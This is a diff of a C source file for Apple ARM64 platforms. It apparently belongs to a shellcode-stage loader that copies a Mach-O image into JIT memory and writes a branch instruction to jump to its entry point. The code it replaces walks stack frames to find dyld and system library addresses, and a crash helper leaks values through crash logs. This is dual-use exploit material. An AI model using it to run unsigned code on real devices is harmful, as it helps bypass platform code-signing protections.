@@ -2,132 +2,52 @@
 #import <mach-o/dyld.h>
 #import <mach-o/dyld_images.h>
 #import <mach/mach.h>
+#import <sys/mman.h>
 #import <stdio.h>
 #import <dlfcn.h>
 
-__attribute__((section("__TEXT, __text")))
-uint64_t* array = NULL;
+void crash(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t);
 
-#define getString(offset) ((char*)array + 144 + offset)
-
-int same_string(const char *s1, const char *s2) {
-    for (int i = 0; s1[i] == s2[i]; i++) {
-        if (s1[i] == '\0') {
-            return 1;
-        }
-    }
-    return 0;
+void* my_memcpy(void *dest, const void *src, size_t n) {
+    unsigned char *d = (unsigned char *)dest;
+    const unsigned char *s = (const unsigned char *)src;
+    while (n--) *d++ = *s++;
+    return dest;
 }
 
-// Check if string is "/usr/lib/system/libsystem_platform.dylib"
-int is_libsystem_platform(char* s) {
-    return s[0] == 47 && s[1] == 117 && s[2] == 115 && s[3] == 114 && s[4] == 47 && s[5] == 108 && s[6] == 105 && s[7] == 98 && s[8] == 47 && s[9] == 115 && s[10] == 121 && s[11] == 115 && s[12] == 116 && s[13] == 101 && s[14] == 109 && s[15] == 47 && s[16] == 108 && s[17] == 105 && s[18] == 98 && s[19] == 115 && s[20] == 121 && s[21] == 115 && s[22] == 116 && s[23] == 101 && s[24] == 109 && s[25] == 95 && s[26] == 112 && s[27] == 108 && s[28] == 97 && s[29] == 116 && s[30] == 102 && s[31] == 111 && s[32] == 114 && s[33] == 109 && s[34] == 46 && s[35] == 100 && s[36] == 121 && s[37] == 108 && s[38] == 105 && s[39] == 98 && s[40] == 0;
-}
-
-// Check if string is "/usr/lib/system/libsystem_kernel.dylib"
-int is_libsystem_kernel(char* s) {
-    return s[0] == 47 && s[1] == 117 && s[2] == 115 && s[3] == 114 && s[4] == 47 && s[5] == 108 && s[6] == 105 && s[7] == 98 && s[8] == 47 && s[9] == 115 && s[10] == 121 && s[11] == 115 && s[12] == 116 && s[13] == 101 && s[14] == 109 && s[15] == 47 && s[16] == 108 && s[17] == 105 && s[18] == 98 && s[19] == 115 && s[20] == 121 && s[21] == 115 && s[22] == 116 && s[23] == 101 && s[24] == 109 && s[25] == 95 && s[26] == 107 && s[27] == 101 && s[28] == 114 && s[29] == 110 && s[30] == 101 && s[31] == 108 && s[32] == 46 && s[33] == 100 && s[34] == 121 && s[35] == 108 && s[36] == 105 && s[37] == 98 && s[38] == 0;
-}
-
-// Check if string is "/usr/lib/system/libsystem_malloc.dylib"
-int is_libsystem_malloc(char* s) {
-    return s[0] == 47 && s[1] == 117 && s[2] == 115 && s[3] == 114 && s[4] == 47 && s[5] == 108 && s[6] == 105 && s[7] == 98 && s[8] == 47 && s[9] == 115 && s[10] == 121 && s[11] == 115 && s[12] == 116 && s[13] == 101 && s[14] == 109 && s[15] == 47 && s[16] == 108 && s[17] == 105 && s[18] == 98 && s[19] == 115 && s[20] == 121 && s[21] == 115 && s[22] == 116 && s[23] == 101 && s[24] == 109 && s[25] == 95 && s[26] == 109 && s[27] == 97 && s[28] == 108 && s[29] == 108 && s[30] == 111 && s[31] == 99 && s[32] == 46 && s[33] == 100 && s[34] == 121 && s[35] == 108 && s[36] == 105 && s[37] == 98 && s[38] == 0;
-}
-
-// Check if string is "/usr/lib/system/libsystem_asl.dylib"
-int is_libsystem_asl(char* s) {
-    return s[0] == 47 && s[1] == 117 && s[2] == 115 && s[3] == 114 && s[4] == 47 && s[5] == 108 && s[6] == 105 && s[7] == 98 && s[8] == 47 && s[9] == 115 && s[10] == 121 && s[11] == 115 && s[12] == 116 && s[13] == 101 && s[14] == 109 && s[15] == 47 && s[16] == 108 && s[17] == 105 && s[18] == 98 && s[19] == 115 && s[20] == 121 && s[21] == 115 && s[22] == 116 && s[23] == 101 && s[24] == 109 && s[25] == 95 && s[26] == 97 && s[27] == 115 && s[28] == 108 && s[29] == 46 && s[30] == 100 && s[31] == 121 && s[32] == 108 && s[33] == 105 && s[34] == 98 && s[35] == 0;
-}
-
-// Check if string is "/usr/lib/system/libsystem_c.dylib"
-int is_libsystem_c(char* s) {
-    return s[0] == 47 && s[1] == 117 && s[2] == 115 && s[3] == 114 && s[4] == 47 && s[5] == 108 && s[6] == 105 && s[7] == 98 && s[8] == 47 && s[9] == 115 && s[10] == 121 && s[11] == 115 && s[12] == 116 && s[13] == 101 && s[14] == 109 && s[15] == 47 && s[16] == 108 && s[17] == 105 && s[18] == 98 && s[19] == 115 && s[20] == 121 && s[21] == 115 && s[22] == 116 && s[23] == 101 && s[24] == 109 && s[25] == 95 && s[26] == 99 && s[27] == 46 && s[28] == 100 && s[29] == 121 && s[30] == 108 && s[31] == 105 && s[32] == 98 && s[33] == 0;
-}
-
-// Check if string is "/usr/lib/system/libdyld.dylib"
-int is__libdyld(char* s) {
-    return s[0] == 47 && s[1] == 117 && s[2] == 115 && s[3] == 114 && s[4] == 47 && s[5] == 108 && s[6] == 105 && s[7] == 98 && s[8] == 47 && s[9] == 115 && s[10] == 121 && s[11] == 115 && s[12] == 116 && s[13] == 101 && s[14] == 109 && s[15] == 47 && s[16] == 108 && s[17] == 105 && s[18] == 98 && s[19] == 100 && s[20] == 121 && s[21] == 108 && s[22] == 100 && s[23] == 46 && s[24] == 100 && s[25] == 121 && s[26] == 108 && s[27] == 105 && s[28] == 98 && s[29] == 0;
-}
-
-// exit with SIGABRT and set x12 to value
-// to get value from it's crash log
-void crash(uint64_t value);
-void* getPrevFP(void);
-
-// Returns the dyld base address
-// Works by traversing the frames on the main thread until we get the next to last
-// which holds the address to the dyld start function
-// then traverses the dyld start function until it finds the Mach-O magic
-uint64_t getDYLDBase(void) {
-    uint64_t fp = (uint64_t)getPrevFP();
-    while (true) {
-        uint64_t tmp = *(uint64_t*)fp;
-        uint64_t tmp2 = *(uint64_t*)tmp;
-        if (tmp2 == 0) {
-            break;
-        }
-        fp = tmp;
-    }
-    uint64_t pc = *(uint64_t*)(fp + 8);
-    uint32_t* magicAddr = (uint32_t*)pc;
-    while (true) {
-        if (*magicAddr == MH_MAGIC || *magicAddr == MH_MAGIC_64) {
-            break;
-        }
-        magicAddr -= 1;
-    }
-    return (uint64_t)magicAddr;
-}
-
-uint64_t getDYLDAllImageInfoAddr(uint64_t dyldBase) {
-    struct mach_header_64* header = (struct mach_header_64*)dyldBase;
+uint64_t findMainEntryPoint(struct mach_header_64* header) {
     struct load_command* command = (struct load_command*)((uint8_t*)header + 32);
-    uint64_t slide = 0;
     for(int i = 0; i < header->ncmds > 0; i++) {
-        if (command->cmd == LC_SEGMENT_64) {
-            struct segment_command_64* segment = (struct segment_command_64*)command;
-            struct section_64* section = (struct section_64*)((uint8_t*)segment + sizeof(struct segment_command_64));
-            if (same_string(section->segname, getString(100)) == 1) {
-                slide = dyldBase - segment->vmaddr;
-            }
-            for (int j = 0; j < segment->nsects; j++) {
-                if (same_string(section->sectname, getString(125)) == 1 || same_string(section->sectname, getString(148)) == 1) {
-                    return section->addr + slide;
-                }
-                section = (struct section_64*)((uint8_t*)section + sizeof(struct section_64));
-            }
+        if (command->cmd == LC_MAIN) {
+            struct entry_point_command* entryCommand = (struct entry_point_command*)command;
+            return entryCommand->entryoff;
         }
         command = (struct load_command *)((void *)command + command->cmdsize);
     }
     return 0;
 }
 
-uint64_t findDYLDImageAddr(struct dyld_all_image_infos* allImageInfos, int (*isImagePath)(char*)) {
-    for (unsigned int i = 0; i < allImageInfos->infoArrayCount; i++) {
-        const struct dyld_image_info* imageInfo = &allImageInfos->infoArray[i];
-        if (isImagePath((char*)imageInfo->imageFilePath) == 1) {
-            return (uint64_t)imageInfo->imageLoadAddress;
-        }
-    }
-    return 0;
+uint32_t generate_b_instruction(uint32_t offset) {
+    uint32_t imm26 = offset / 4;
+    uint32_t instruction = 0x14000000 | (imm26 & 0x03FFFFFF);
+    return instruction;
 }
 
-int c_start(uint64_t* array_ptr) {
-    array = array_ptr;
-    uint64_t dyldBase = getDYLDBase();
-    uint64_t dyldAllImageInfoAddr = getDYLDAllImageInfoAddr(dyldBase);
-    if (dyldAllImageInfoAddr == 0) {
-        crash(404);
-    }
+// JIT code address, shellcode array address, mach-o address and mach-o size
+int c_start(uint64_t JITAddress, uint64_t shellcodeAddress, void* machoBytes, size_t execSize) {
+    //crash(execSize,execSize,execSize,execSize,execSize,execSize,execSize,execSize);
     
-    struct dyld_all_image_infos* allImageInfos = (struct dyld_all_image_infos*)dyldAllImageInfoAddr;
-    // Find the base addresses of some libraries
-    array[0] = dyldBase;
-    array[1] = dyldAllImageInfoAddr;
-    array[2] = findDYLDImageAddr(allImageInfos, is_libsystem_c);
-    array[3] = findDYLDImageAddr(allImageInfos, is_libsystem_malloc);
-    array[4] = findDYLDImageAddr(allImageInfos, is_libsystem_kernel);
-    array[5] = findDYLDImageAddr(allImageInfos, is_libsystem_platform);
-    array[6] = findDYLDImageAddr(allImageInfos, is__libdyld);
+    uint64_t alignedAddress = (JITAddress + 0x4000) & 0xFFFFFFFFFFFFF000;
+    uint64_t entryOff = findMainEntryPoint(machoBytes);
+    uint64_t alignOff = alignedAddress - JITAddress;
+    
+//    uint32_t test = *(uint32_t*)(machoBytes + entryOff);
+//    crash(test,test,test,test,test,test,test,test);
+    
+//    *(uint32_t*)(machoBytes + entryOff) = generate_b_instruction(0);
+    
+    my_memcpy((void*)shellcodeAddress + alignOff, machoBytes, execSize);
+    uint32_t instruction = generate_b_instruction((uint32_t)(alignedAddress - JITAddress) + (uint32_t)entryOff);
+    *(uint32_t*)shellcodeAddress = instruction;
     return 0;
 }
